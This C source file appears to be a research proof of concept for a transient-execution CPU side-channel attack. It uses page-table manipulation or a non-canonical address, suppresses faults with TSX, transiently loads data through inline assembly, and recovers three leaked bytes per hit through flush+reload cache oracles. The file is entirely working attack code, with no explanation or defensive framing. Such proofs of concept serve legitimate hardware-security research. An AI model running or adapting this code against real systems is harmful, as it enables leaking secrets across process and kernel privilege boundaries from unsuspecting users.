#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <memory.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include "../cacheutils.h"
#include "../PTEditor/ptedit_header.h"

#define SUP_TSX 1
#define SUP_FH 0

#define XMMLOAD 0
#define YMMLOAD 1

#define FAULTASSIST_S 0
#define FAULTASSIST_P 0
#define FAULTASSIST_A 0
#define FAULTASSIST_NONCAN 1

#define PAGE_SIZE 4096
#define PAGE_COUNT 10
#define STEP 8

uint8_t __attribute__((aligned(PAGE_SIZE))) oracle1[256 * PAGE_SIZE];
uint8_t __attribute__((aligned(PAGE_SIZE))) oracle2[256 * PAGE_SIZE];
uint8_t __attribute__((aligned(PAGE_SIZE))) oracle3[256 * PAGE_SIZE];
uint8_t __attribute__((aligned(PAGE_SIZE))) read_page[PAGE_SIZE * PAGE_COUNT];

void transient();

void *noncanon = (void *)0x5678ff0000000000ull,
     *nulladdr = (void *)NULL,
     *ptr_read, *ptr_target;

void setup_oracle()
{
    memset(oracle1, 0, sizeof(oracle1));
    memset(oracle2, 0, sizeof(oracle2));
    memset(oracle3, 0, sizeof(oracle3));

    CACHE_MISS = detect_flush_reload_threshold();
    fprintf(stderr, "[+] Flush+Reload Threshold: %zu\n", CACHE_MISS);
}

void setup_fh()
{
    signal(SIGSEGV, trycatch_segfault_handler);
    signal(SIGFPE, trycatch_segfault_handler);
}

uint64_t start_timer = 0, end_timer = 0, temp_timer = 0, counter = 0, success_counter = 0;

int main(int argc, char *argv[])
{
    setup_oracle();
    setup_fh();
    ptedit_init();

    memset(read_page, 0, PAGE_SIZE * PAGE_COUNT);

    ptr_target = read_page;

#if FAULTASSIST_S
    for (int i = 0; i < PAGE_COUNT; i++)
        ptedit_pte_clear_bit(&read_page[i * PAGE_SIZE], 0, PTEDIT_PAGE_BIT_USER);
#elif FAULTASSIST_P
    for (int i = 0; i < PAGE_COUNT; i++)
        ptedit_pte_clear_bit(&read_page[i * PAGE_SIZE], 0, PTEDIT_PAGE_BIT_PRESENT);
#elif FAULTASSIST_A
    for (int i = 0; i < PAGE_COUNT; i++)
        ptedit_pte_clear_bit(&read_page[i * PAGE_SIZE], 0, PTEDIT_PAGE_BIT_ACCESSED);
#elif FAULTASSIST_NONCAN
    ptr_target = noncanon;
#endif

    int goodaddress = 0;

    ptedit_cleanup();
    int offset = 0;
    while (1)
    {
        for (int o = 0; o < 4096 * PAGE_COUNT; o += STEP)
        {
            counter++;
            temp_timer = rdtsc();
            if (!goodaddress)
                offset = o;

            ptr_read = ptr_target + offset;

#if SUP_TSX
            if (xbegin() == (~0u))
            {
#elif SUP_FH
            if (!setjmp(trycatch_buf))
            {
#else
            {
#endif
                transient();

#if SUP_TSX
                xend();
#endif
            }

            for (int i = 'A'; i <= 'z'; i++)
            {
                if (flush_reload((uint8_t *)oracle1 + 4096 * i))
                {
                    for (int j = 'A'; j <= 'z'; j++)
                    {
                        if (flush_reload((uint8_t *)oracle2 + 4096 * j))
                        {
                            for (int k = 'A'; k <= 'z'; k++)
                            {
                                if (flush_reload((uint8_t *)oracle3 + 4096 * k))
                                {
                                    success_counter++;
                                    fprintf(stdout, "%p: %c%c%c\n",
                                            ptr_read, (uint8_t)i, (uint8_t)j, (uint8_t)k);
                                    fprintf(stdout, "%ld\n", end_timer);
                                    fflush(stdout);
                                    printf("%ld %ld %lf\%\n", counter, success_counter,
                                           (double)success_counter * 100 / counter);
                                    return 0;
                                }
                            }
                        }
                    }
                }
            }

            end_timer += rdtsc() - temp_timer;

            mfence();
        }
    }
}

void transient()
{
    asm volatile(
        // %0 = &ptr_read
        // move (%0) to %%rcx
        "mov (%0), %%rcx\n\t"
#if XMMLOAD
        "movups (%%rcx), %%xmm0\n\t"
        "movq %%xmm0, %%rax\n\t"
#elif YMMLOAD
        // move unaligned (%%rcx) to %%ymm0
        "vmovups (%%rcx), %%ymm0\n\t"
        // extrat from $0 with dword offset %%xmm0 to %%rax
        "vpextrq $0, %%xmm0, %%rax\n\t"
#else
        "mov (%%rcx), %%rax\n\t"
#endif

        // oracle1
        "mov %%rax, %%rbx\n\t"
        "mov %%rax, %%rcx\n\t"
        "and $0xff, %%rax\n\t"
        "shlq $12, %%rax\n\t"
        "movb (%1,%%rax), %%al\n\t"

        // oracle2
        "shr $8, %%rbx\n\t"
        "and $0xff, %%rbx\n\t"
        "shlq $12, %%rbx\n\t"
        "movb (%2,%%rbx), %%al\n\t"

        // oracle3
        "shr $16, %%rcx\n\t"
        "and $0xff, %%rcx\n\t"
        "shlq $12, %%rcx\n\t"
        "movb (%3,%%rcx), %%al\n\t"

        :
        : "r"(&ptr_read), "r"(oracle1), "r"(oracle2), "r"(oracle3)
        : "rax", "rbx", "rcx", "memory");
}
